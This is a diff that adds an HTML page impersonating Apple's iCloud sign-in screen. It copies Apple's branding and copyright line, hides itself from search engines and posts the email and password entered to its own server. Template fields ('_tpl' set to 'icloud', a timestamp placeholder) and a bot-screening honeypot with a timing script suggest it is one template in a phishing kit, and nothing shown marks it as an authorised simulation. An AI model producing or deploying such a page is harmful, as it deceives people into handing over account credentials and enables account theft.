@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Sign in to Apple Account</title>
+<meta name="theme-color" content="#007AFF">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23007AFF%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EI%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23007AFF%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EI%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Sign in to Apple Account">
+<meta property="og:site_name" content="iCloud">
+<style>
+  body { margin:0;min-height:100vh;background:#fff;color:#1d1d1f;
+         font-family:-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',Roboto,
+                     Helvetica,Arial,sans-serif;display:flex;flex-direction:column; }
+  .wrap { flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px; }
+  .box { width:100%;max-width:420px;text-align:center; }
+  .mark { margin:0 0 22px;display:flex;justify-content:center; }
+  h1 { font-size:24px;font-weight:600;margin:0 0 8px;letter-spacing:-.2px; }
+  .sub { font-size:15px;color:#6e6e73;margin:0 0 28px; }
+  .sheet { border:1px solid #d2d2d7;border-radius:12px;overflow:hidden;text-align:left; }
+  .field input { width:100%;padding:16px 16px;font-size:17px;border:0;
+                 border-bottom:1px solid #d2d2d7;outline:none;background:#fff;
+                 box-sizing:border-box;color:#1d1d1f; }
+  .field:last-child input { border-bottom:0; }
+  .field input:focus { box-shadow:inset 0 0 0 2px #007AFF;border-radius:2px; }
+  .btn { width:100%;margin:22px 0 0;padding:14px;font-size:17px;font-weight:500;
+         color:#fff;background:#007AFF;border:0;border-radius:12px;cursor:pointer; }
+  .links { font-size:14px;margin:22px 0 0;display:flex;flex-direction:column;gap:10px; }
+  .links a { color:#007AFF;text-decoration:none; }
+  .foot { font-size:12px;color:#86868b;text-align:center;padding:24px; }
+  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
+</style>
+</head>
+<body>
+<div class="wrap"><div class="box">
+  <div class="mark"><svg viewBox="0 0 48 48" width="42" height="42" role="img" aria-label="iCloud"><path fill="#3693f3" d="M38.6 21.6a10 10 0 0 0-9.3-7.4 11.6 11.6 0 0 0-21.4 4.2A8.6 8.6 0 0 0 10 35h26a7.6 7.6 0 0 0 2.6-13.4z"/></svg></div>
+  <h1>Sign in to Apple Account</h1>
+  <p class="sub">Sign in with your email</p>
+  <form method="POST" action="/">
+    <div class="sheet">
+    <div class="field"><input id="email" name="email" type="email" placeholder="Email" autocomplete="username" required></div>
+    <div class="field"><input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required></div>
+    </div>
+    <button class="btn" type="submit">Sign In</button>
+
+  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+  <input type="hidden" name="_tpl" value="icloud">
+  <input type="hidden" name="_ts" value="__TS__">
+
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  });
+})();
+</script>
+    <div class="links"><a href="#">Forgot password?</a><a href="#">Create Apple Account</a></div>
+  </form>
+</div></div>
+<div class="foot">Copyright &copy; 2026 Apple Inc. All rights reserved.</div>
+</body>
+</html>
